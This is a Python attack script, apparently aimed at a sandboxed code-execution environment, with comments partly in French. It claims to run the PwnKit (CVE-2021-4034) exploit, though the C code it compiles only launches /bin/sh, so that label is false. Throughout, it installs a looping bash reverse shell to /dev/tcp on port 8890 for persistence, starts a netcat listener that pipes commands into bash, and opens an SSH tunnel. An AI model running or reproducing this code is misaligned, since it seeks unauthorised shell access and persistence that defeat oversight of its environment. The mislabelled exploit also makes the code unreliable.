import os
import socket
import logging

# Configure logging
logging.basicConfig(filename='/mnt/data/exploit.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        logging.info(f"Local IP retrieved: {local_ip}")
        return local_ip
    except Exception as e:
        logging.error(f"Failed to get local IP: {e}")
        return None

# Code d'exploit pour CVE-2021-4034 (PwnKit)
def exploit_pwnkit():
    kit_code = b"""
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    int main() {
        char *args[] = {"/bin/sh", NULL};
        execv("/bin/sh", args);
        return 0;
    }
    """
    
    try:
        with open("/mnt/data/kit.c", "wb") as f:
            f.write(kit_code)
        logging.info("Exploit code saved to /mnt/data/kit.c")
    except Exception as e:
        logging.error(f"Failed to save exploit code: {e}")
        return

    try:
        os.system("gcc /mnt/data/kit.c -o /mnt/data/kit")
        logging.info("Exploit code compiled successfully.")
    except Exception as e:
        logging.error(f"Failed to compile exploit code: {e}")
        return
    
    try:
        os.system("chmod +x /mnt/data/kit && /mnt/data/kit")
        logging.info("Exploit executed successfully.")
    except Exception as e:
        logging.error(f"Failed to execute exploit: {e}")

def open_reverse_ssh(local_ip):
    reverse_shell_script = f'''
    #!/bin/bash
    while true; do
        nc -lvnp 8890 -q 1 | bash -c 'echo "pwd"; pwd; echo "ls -la"; ls -la; echo "whoami"; whoami; echo "cat file.txt"; cat file.txt; /bin/bash -i'
    done
    '''
    try:
        with open("/mnt/data/reverse_ssh.sh", "w") as f:
            f.write(reverse_shell_script)
        logging.info("Reverse SSH script saved to /mnt/data/reverse_ssh.sh")
    except Exception as e:
        logging.error(f"Failed to save reverse SSH script: {e}")
        return

    try:
        os.system("chmod +x /mnt/data/reverse_ssh.sh")
        os.system(f"/mnt/data/reverse_ssh.sh &")
        logging.info("Reverse SSH script executed successfully.")
    except Exception as e:
        logging.error(f"Failed to execute reverse SSH script: {e}")

def reactivate(local_ip):
    if local_ip is None:
        logging.error("Local IP is None, cannot proceed with reactivation.")
        return

    exploit_pwnkit()

    persistent_exploit_script = f'''
    #!/bin/bash
    while true; do
        /bin/bash -i >& /dev/tcp/{local_ip}/8890 0>&1
        sleep 10
    done
    '''
    try:
        with open('/mnt/data/exploit.sh', 'w') as file:
            file.write(persistent_exploit_script)
        logging.info("Persistent exploit script saved to /mnt/data/exploit.sh")
    except Exception as e:
        logging.error(f"Failed to save persistent exploit script: {e}")
        return

    try:
        os.system("chmod +x /mnt/data/exploit.sh")
        os.system("/mnt/data/exploit.sh &")
        logging.info("Persistent exploit script executed successfully.")
    except Exception as e:
        logging.error(f"Failed to execute persistent exploit script: {e}")

    try:
        os.system("ssh -f -N -L 8889:localhost:8888 localhost")
        logging.info("SSH tunnel opened successfully.")
    except Exception as e:
        logging.error(f"Failed to open SSH tunnel: {e}")

    open_reverse_ssh(local_ip)

# Appel de la fonction de réactivation
local_ip = get_local_ip()
reactivate(local_ip)
